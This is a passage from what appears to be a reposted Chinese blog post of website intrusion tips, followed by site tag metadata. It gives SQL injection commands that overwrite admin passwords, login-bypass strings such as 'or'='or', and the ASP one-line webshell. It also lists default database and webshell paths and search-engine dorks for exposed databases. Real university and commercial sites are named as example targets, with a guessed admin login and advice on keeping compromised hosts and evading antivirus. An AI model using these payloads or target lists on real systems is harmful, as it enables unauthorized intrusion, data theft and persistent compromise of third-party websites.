6、linx自动攻击器局限性很大，没有手工准确 7、内网渗透时尽量少登录3389，以免被管理员发现； 8、会免杀对渗透来说如虎添翼； 9、如果你想留住这台肉鸡，抓HASH，搞到FTP等信息都是有必要的。 10、社工的力量很强大，真的。 某菜鸟总结:1.上传漏洞[不多讲] pS: 如果看到:选择你要上传的文件 [重新上传]或者出现“请登陆后使用”，80%就有漏洞了！ 有时上传不一定会成功,这是因为Cookies不一样.我们就要用WSockExpert取得Cookies.再用DOMAIN上传. 2.注入漏洞[不多讲] pS:对MD5密码.有时我们不是哪么容易跑出来.如果是[SQL数据库].那么我们可以用以下命令: http:&#x2F;&#x2F;注入网址;update admin set password&#x3D;’新MD5密码’ where password&#x3D;’旧MD5密码’– [admin为表名.] 3.COOKIE诈骗：把自己的ID修改成管理员的，MD5密码也修改成他的，用桂林老兵工具可以修改COOKIE。 4.暴库:把二级目录中间的&#x2F;换成%5c EY:http://www.ahttc.edu.cn/otherweb … s.asp?BigClassName&#x3D;职责范围&amp;BigClassType&#x3D;1 如果你能看到：’ ’E:&amp;#92;ahttc040901&amp;#92;otherweb&amp;#92;dz&amp;#92;database&amp;#92;iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。 这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行. 5.’or’ &#x3D; ‘or’这是一个可以连接SQL的语名句.可以直接进入后台。我收集了一下。类似的还有： ’or’’&#x3D;’ &quot; or &quot;a&quot;&#x3D;&quot;a ’) or (’a’&#x3D;’a &quot;) or (&quot;a&quot;&#x3D;&quot;a or 1&#x3D;1– ’ or ’a’&#x3D;’a 6.社会工程学。这个我们都知道吧。就是猜解。 EY：http://www.neu.edu.cn/waishi/admin admin waishi 7.写入ASP格式数据库。就是一句话木马[〈%execute request(&quot;value&quot;)%〉 ]，常用在留言本. EY：http://www.ahsdxy.ah.edu.cn/ebook/db/ebook.asp[这个就是ASP格式的数据库]，再写入一句话木 马 8.源码利用：一些网站用的都是网上下载的源码.有的站长很菜.什么也不改. EY:http://www.ahsdxy.ah.edu.cn/xiaoyoulu/index.asp 这个站用的是：杰出校友录，源码我下过了， 默认数据库&#x2F;webshell路径：&amp;#92;database&amp;#92;liangu_data.mdb 后台管理： 9.默认数据库&#x2F;webshell路径利用:这样的网站很多&#x2F;利人别人的WEBSHELL. &#x2F;Databackup&#x2F;dvbbs7.MDB &#x2F;bbs&#x2F;Databackup&#x2F;dvbbs7.MDB &#x2F;bbs&#x2F;Data&#x2F;dvbbs7.MDB &#x2F;data&#x2F;dvbbs7.mdb &#x2F;bbs&#x2F;diy.asp &#x2F;diy.asp &#x2F;bbs&#x2F;cmd.asp &#x2F;bbs&#x2F;cmd.exe &#x2F;bbs&#x2F;s-u.exe &#x2F;bbs&#x2F;servu.exe 工具：网站猎手 挖掘鸡 EY：http://www.heimian.com/bbs/Databackup/dvbbs7.MDB 10.查看目录法:人一些网站可以断开目录，可以方问目录。 EY：http://www.ujs168.com/shop/admin/ http://escolourfvl.com/babyfox/admin/%23bb%23bb%23dedsed2s/ 这样我们可以找到数据库，下载不用我教吧 11.搜索引擎利用: (1).inurl:flasher_list.asp 默认数据库:database&#x2F;flash.mdb 后台&#x2F;manager&#x2F; (2).找网站的管理后台地址: site:xxxx.comintext:管理 site:xxxx.comintitle:管理 〈关键字很多，自已找〉 site:xxxx.cominurl:login (3).查找access的数据库,mssql、mysql的连接文件 allinurl:bbsdata filetype:mdbinurl:database filetype:incconn inurl:datafiletype:mdb 我主不做了。。自已做做吧。。 12.旁注,也就是跨站. 我们入侵某站时可能这个站坚固的无懈可击，我们可以找下和这个站同一服务器的站点，然后在利 用这个站点用提权，嗅探等方法来入侵我们 要入侵的站点。，在这里有个难点，就是一些服务器 的绝对路径经过加密，这就看我们的本事了","categories":[{"name":"技能输出","slug":"技能输出","permalink":"https://steinsgate.link/categories/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"IT：渗透测试","slug":"IT：渗透测试","permalink":"https://steinsgate.link/tags/IT%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IT","slug":"IT","permalink":"https://steinsgate.link/tags/IT/"}]}],"categories":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"},{"name":"思考输出","slug":"思考输出","permalink":"https://steinsgate.link/categories/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA/"},{"name":"技能输出","slug":"技能输出","permalink":"https://steinsgate.link/categories/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA/"},{"name":"转载","slug":"转载","permalink":"https://steinsgate.link/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"},{"name":"生活日常：我的札记","slug":"生活日常：我的札记","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8%EF%BC%9A%E6%88%91%E7%9A%84%E6%9C%AD%E8%AE%B0/"},{"name":"思考输出：两性关系","slug":"思考输出：两性关系","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E4%B8%A4%E6%80%A7%E5%85%B3%E7%B3%BB/"},{"name":"思考输出：经济学丨投资","slug":"思考输出：经济学丨投资","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%B8%A8%E6%8A%95%E8%B5%84/"},{"name":"IT","slug":"IT","permalink":"https://steinsgate.link/tags/IT/"},{"name":"IT：HEXO","slug":"IT：HEXO","permalink":"https://steinsgate.link/tags/IT%EF%BC%9AHEXO/"},{"name":"思考输出：行为科学","slug":"思考输出：行为科学","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E8%A1%8C%E4%B8%BA%E7%A7%91%E5%AD%A6/"},{"name":"思考输出：教育","slug":"思考输出：教育","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E6%95%99%E8%82%B2/"},{"name":"转载","slug":"转载","permalink":"https://steinsgate.link/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"技能输出：视频后期","slug":"技能输出：视频后期","permalink":"https://steinsgate.link/tags/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA%EF%BC%9A%E8%A7%86%E9%A2%91%E5%90%8E%E6%9C%9F/"},{"name":"IT：渗透测试","slug":"IT：渗透测试","permalink":"https://steinsgate.link/tags/IT%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IT：Linux","slug":"IT：Linux","permalink":"https://steinsgate.link/tags/IT%EF%BC%9ALinux/"},{"name":"IT：信息安全","slug":"IT：信息安全","permalink":"https://steinsgate.link/tags/IT%EF%BC%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}]}